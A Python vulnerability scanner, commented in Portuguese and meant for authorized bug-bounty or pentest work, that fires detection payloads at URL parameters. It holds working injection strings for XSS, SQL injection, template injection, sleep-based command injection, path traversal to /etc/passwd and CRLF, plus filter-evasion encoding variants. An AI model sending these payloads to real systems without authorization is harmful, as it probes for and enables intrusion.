#!/usr/bin/env python3
"""
param_vuln_scanner.py — Testa URLs com parâmetros (ex: saída do ParamSpider) em busca de
indícios de vulnerabilidades comuns, via heurísticas de detecção (não exploração).

USO:
    python3 param_vuln_scanner.py urls.txt
    python3 param_vuln_scanner.py urls.txt --threads 15 --ssrf-callback http://SEU_ID.oast.fun
    python3 param_vuln_scanner.py urls.txt --checks xss,sqli,ssti

ATENÇÃO:
    Use somente em alvos com autorização explícita (bug bounty / pentest contratado).
    Este script faz requisições ativas contra o alvo (incluindo payloads que podem
    disparar delays propositais para detecção blind). Não executa exploração real
    (sem RCE, sem gadget chains de deserialização, sem IDOR/CSRF/session hijacking —
    essas classes exigem análise manual/lógica de negócio e não são cobertas aqui).

Categorias cobertas (detecção via heurística, não PoC de exploração completa):
    - XSS refletido
    - SQL Injection (error-based, boolean-based, time-based)
    - SSTI (avaliação de expressão)
    - Command Injection (time-based blind)
    - Path Traversal / LFI (leitura de /etc/passwd ou win.ini)
    - Open Redirect
    - CRLF Injection
    - SSRF (requer --ssrf-callback apontando pro seu próprio listener, ex: interactsh)
    - Cabeçalhos de segurança ausentes (Security Misconfiguration / Sensitive Data Exposure)

Dependências: pip install requests --break-system-packages
"""

import argparse
import json
import re
import sys
import time
import urllib.parse as urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] Instale 'requests': pip install requests --break-system-packages")
    sys.exit(1)


class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; N = "\033[0m"; BOLD = "\033[1m"

def ok(msg): print(f"{C.G}[+]{C.N} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.N} {msg}")
def bad(msg): print(f"{C.R}[VULN]{C.N} {msg}")
def info(msg): print(f"{C.B}[i]{C.N} {msg}")


# ---------------------------------------------------------------------------
# Payloads e padrões
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<sCr1pt>alert(1337)</sCr1pt>",
    "\"><svg/onload=alert(1337)>",
    "'\"><img src=x onerror=alert(1337)>",
]


def encoding_variants(payload):
    """Gera variações de encoding do payload para tentar passar por filtros simples
    (case swap, url-encode single, url-encode double). Não é um motor de evasão de WAF
    completo — apenas variações padrão que qualquer scanner (ffuf, sqlmap) já usa."""
    variants = [payload]
    # case swap (só afeta payloads com letras, ex: SELECT -> sElEcT)
    swapped = "".join(c.upper() if c.islower() else c.lower() for c in payload)
    if swapped != payload:
        variants.append(swapped)
    # url-encode simples
    variants.append(urlparse.quote(payload, safe=""))
    # url-encode duplo
    variants.append(urlparse.quote(urlparse.quote(payload, safe=""), safe=""))
    return variants

SSTI_PAYLOADS = {
    "{{7*7}}": "49",
    "${7*7}": "49",
    "#{7*7}": "49",
    "<%= 7*7 %>": "49",
    "*{7*7}": "49",
}

SQLI_ERROR_PAYLOADS = ["'", "\"", "')", "\")"]
SQLI_ERROR_PATTERNS = [
    r"sql syntax", r"mysql_fetch", r"unclosed quotation mark", r"pg_query\(\)",
    r"sqlite3\.OperationalError", r"ORA-\d{5}", r"warning: mysql",
    r"SQLSTATE\[", r"ODBC SQL Server Driver", r"PostgreSQL.*ERROR",
    r"Microsoft OLE DB Provider for SQL Server", r"Unclosed quotation mark after the character string",
]
SQLI_BOOLEAN_TRUE = "' OR '1'='1"
SQLI_BOOLEAN_FALSE = "' AND '1'='2"
SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
]

CMDI_TIME_PAYLOADS = [
    "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& ping -n 6 127.0.0.1 &",
]

LFI_PAYLOADS = {
    "../../../../../../etc/passwd": r"root:.*:0:0:",
    "..%2f..%2f..%2f..%2fetc%2fpasswd": r"root:.*:0:0:",
    "../../../../../../windows/win.ini": r"\[fonts\]",
}

CRLF_PAYLOAD = "%0d%0aSet-Cookie:crlf_test=1"

OPEN_REDIRECT_PAYLOAD = "https://example.com/"

SECURITY_HEADERS = [
    "Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options",
    "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy",
]

TIME_THRESHOLD = 4.5  # segundos acima do baseline para considerar blind confirmado


def load_urls(path):
    with open(path, encoding="utf-8", errors="ignore") as f:
        urls = [l.strip() for l in f if l.strip() and "=" in l]
    # dedup mantendo ordem
    seen = set()
    out = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def build_url(url, param, value):
    parsed = urlparse.urlparse(url)
    qs = urlparse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlparse.urlencode(qs, doseq=True)
    return parsed._replace(query=new_query).geturl()


def get_params(url):
    parsed = urlparse.urlparse(url)
    return list(urlparse.parse_qs(parsed.query, keep_blank_values=True).keys())


def baseline_time(url, session):
    try:
        t0 = time.time()
        session.get(url, timeout=10, verify=False)
        return time.time() - t0
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Testes por categoria — cada função retorna dict do achado ou None
# ---------------------------------------------------------------------------

def check_xss(url, param, session):
    for payload in XSS_PAYLOADS:
        test_url = build_url(url, param, payload)
        try:
            r = session.get(test_url, timeout=8, verify=False)
        except requests.RequestException:
            continue
        if payload in r.text:
            return {"type": "XSS", "url": test_url, "param": param,
                    "evidence": "payload refletido sem sanitização"}
    return None


def check_sqli(url, param, session, base_time):
    # error-based
    for payload in SQLI_ERROR_PAYLOADS:
        test_url = build_url(url, param, payload)
        try:
            r = session.get(test_url, timeout=8, verify=False)
        except requests.RequestException:
            continue
        low = r.text.lower()
        for pattern in SQLI_ERROR_PATTERNS:
            if re.search(pattern, low, re.IGNORECASE):
                return {"type": "SQLi (error-based)", "url": test_url, "param": param,
                        "evidence": f"padrão de erro SQL detectado: {pattern}"}

    # boolean-based (compara tamanho de resposta true vs false)
    try:
        r_true = session.get(build_url(url, param, SQLI_BOOLEAN_TRUE), timeout=8, verify=False)
        r_false = session.get(build_url(url, param, SQLI_BOOLEAN_FALSE), timeout=8, verify=False)
        if abs(len(r_true.text) - len(r_false.text)) > 50 and r_true.status_code == r_false.status_code:
            return {"type": "SQLi (boolean-based, suspeita)", "url": url, "param": param,
                    "evidence": f"resposta TRUE ({len(r_true.text)} bytes) difere significativamente de FALSE ({len(r_false.text)} bytes) — confirmar manualmente"}
    except requests.RequestException:
        pass

    # time-based blind
    if base_time is not None:
        for payload in SQLI_TIME_PAYLOADS:
            test_url = build_url(url, param, payload)
            try:
                t0 = time.time()
                session.get(test_url, timeout=15, verify=False)
                elapsed = time.time() - t0
                if elapsed - base_time > TIME_THRESHOLD:
                    return {"type": "SQLi (time-based blind)", "url": test_url, "param": param,
                            "evidence": f"delay de {elapsed:.1f}s vs baseline {base_time:.1f}s"}
            except requests.exceptions.Timeout:
                return {"type": "SQLi (time-based blind)", "url": test_url, "param": param,
                        "evidence": "timeout consistente com sleep injetado"}
            except requests.RequestException:
                continue
    return None


def check_ssti(url, param, session):
    for payload, expected in SSTI_PAYLOADS.items():
        test_url = build_url(url, param, payload)
        try:
            r = session.get(test_url, timeout=8, verify=False)
        except requests.RequestException:
            continue
        if expected in r.text and payload not in r.text:
            return {"type": "SSTI", "url": test_url, "param": param,
                    "evidence": f"'{payload}' avaliado para '{expected}'"}
    return None


def check_cmdi(url, param, session, base_time):
    if base_time is None:
        return None
    for payload in CMDI_TIME_PAYLOADS:
        test_url = build_url(url, param, payload)
        try:
            t0 = time.time()
            session.get(test_url, timeout=15, verify=False)
            elapsed = time.time() - t0
            if elapsed - base_time > TIME_THRESHOLD:
                return {"type": "OS Command Injection (time-based blind)", "url": test_url, "param": param,
                        "evidence": f"delay de {elapsed:.1f}s vs baseline {base_time:.1f}s com payload '{payload}'"}
        except requests.exceptions.Timeout:
            return {"type": "OS Command Injection (time-based blind)", "url": test_url, "param": param,
                    "evidence": f"timeout consistente com payload '{payload}'"}
        except requests.RequestException:
            continue
    return None


def check_lfi(url, param, session):
    for payload, pattern in LFI_PAYLOADS.items():
        test_url = build_url(url, param, payload)
        try:
            r = session.get(test_url, timeout=8, verify=False)
        except requests.RequestException:
            continue
        if re.search(pattern, r.text, re.IGNORECASE):
            return {"type": "Path Traversal / LFI", "url": test_url, "param": param,
                    "evidence": f"conteúdo de arquivo do sistema refletido (padrão: {pattern})"}
    return None


def check_open_redirect(url, param, session):
    if param.lower() not in ("redirect", "url", "next", "return", "returnurl", "redirect_uri",
                              "continue", "dest", "destination", "goto", "target", "r", "u"):
        return None
    test_url = build_url(url, param, OPEN_REDIRECT_PAYLOAD)
    try:
        r = session.get(test_url, timeout=8, verify=False, allow_redirects=False)
        location = r.headers.get("Location", "")
        if location and "example.com" in location:
            return {"type": "Open Redirect", "url": test_url, "param": param,
                    "evidence": f"redirecionou para {location}"}
    except requests.RequestException:
        pass
    return None


def check_crlf(url, param, session):
    test_url = build_url(url, param, CRLF_PAYLOAD)
    try:
        r = session.get(test_url, timeout=8, verify=False, allow_redirects=False)
        if "crlf_test=1" in str(r.headers):
            return {"type": "CRLF Injection", "url": test_url, "param": param,
                    "evidence": "cabeçalho injetado refletido na resposta"}
    except requests.RequestException:
        pass
    return None


def check_ssrf(url, param, session, callback):
    if not callback:
        return None
    test_url = build_url(url, param, callback)
    try:
        session.get(test_url, timeout=8, verify=False)
        return {"type": "SSRF (candidato)", "url": test_url, "param": param,
                "evidence": "payload enviado — confira seu listener/interactsh para callback recebido"}
    except requests.RequestException:
        return None


def check_security_headers(url, session, cache):
    base = urlparse.urlparse(url)
    origin = f"{base.scheme}://{base.netloc}"
    if origin in cache:
        return None
    cache.add(origin)
    try:
        r = session.get(origin, timeout=8, verify=False)
    except requests.RequestException:
        return None
    missing = [h for h in SECURITY_HEADERS if h not in r.headers]
    if missing:
        return {"type": "Security Misconfiguration", "url": origin, "param": "-",
                "evidence": f"cabeçalhos de segurança ausentes: {', '.join(missing)}"}
    return None


# ---------------------------------------------------------------------------
# Orquestração
# ---------------------------------------------------------------------------

ALL_CHECKS = ["xss", "sqli", "ssti", "cmdi", "lfi", "redirect", "crlf", "ssrf", "headers"]

def scan_url(url, session, checks, ssrf_callback, headers_cache):
    findings = []
    params = get_params(url)
    if not params:
        return findings

    base_time = None
    if "sqli" in checks or "cmdi" in checks:
        base_time = baseline_time(url, session)

    if "headers" in checks:
        res = check_security_headers(url, session, headers_cache)
        if res:
            findings.append(res)

    for param in params:
        if "xss" in checks:
            res = check_xss(url, param, session)
            if res: findings.append(res)
        if "sqli" in checks:
            res = check_sqli(url, param, session, base_time)
            if res: findings.append(res)
        if "ssti" in checks:
            res = check_ssti(url, param, session)
            if res: findings.append(res)
        if "cmdi" in checks:
            res = check_cmdi(url, param, session, base_time)
            if res: findings.append(res)
        if "lfi" in checks:
            res = check_lfi(url, param, session)
            if res: findings.append(res)
        if "redirect" in checks:
            res = check_open_redirect(url, param, session)
            if res: findings.append(res)
        if "crlf" in checks:
            res = check_crlf(url, param, session)
            if res: findings.append(res)
        if "ssrf" in checks:
            res = check_ssrf(url, param, session, ssrf_callback)
            if res: findings.append(res)

    return findings


def main():
    parser = argparse.ArgumentParser(description="Scanner de vulnerabilidades em parâmetros (a partir de arquivo de URLs)")
    parser.add_argument("file", help="arquivo .txt com URLs contendo parâmetros (ex: saída do paramspider)")
    parser.add_argument("--threads", type=int, default=10, help="threads paralelas (default 10)")
    parser.add_argument("--checks", default=",".join(ALL_CHECKS),
                         help=f"lista separada por vírgula: {','.join(ALL_CHECKS)} (default: todos)")
    parser.add_argument("--ssrf-callback", default=None,
                         help="URL do seu listener (ex: interactsh/Burp Collaborator) para testar SSRF")
    parser.add_argument("--output", default="vuln_findings.json", help="arquivo de saída JSON")
    args = parser.parse_args()

    checks = [c.strip().lower() for c in args.checks.split(",")]
    urls = load_urls(args.file)
    ok(f"{len(urls)} URLs com parâmetros carregadas de {args.file}")
    info(f"checks ativos: {', '.join(checks)}")
    if "ssrf" in checks and not args.ssrf_callback:
        warn("check SSRF ativo mas sem --ssrf-callback definido — SSRF será pulado")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (param-vuln-scanner; authorized-testing)"})

    headers_cache = set()
    all_findings = []

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(scan_url, u, session, checks, args.ssrf_callback, headers_cache): u for u in urls}
        for f in as_completed(futs):
            url = futs[f]
            try:
                findings = f.result()
            except Exception as e:
                warn(f"erro testando {url}: {e}")
                continue
            for finding in findings:
                all_findings.append(finding)
                bad(f"{finding['type']} — {finding['url']} (param={finding['param']}) :: {finding['evidence']}")

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(all_findings, f, indent=2, ensure_ascii=False)

    print()
    ok(f"Total de achados: {len(all_findings)}")
    ok(f"Resultados salvos em: {args.output}")
    if all_findings:
        warn("Todo achado aqui é heurístico — confirme manualmente (ex: com Burp/curl) antes de reportar.")


if __name__ == "__main__":
    main()
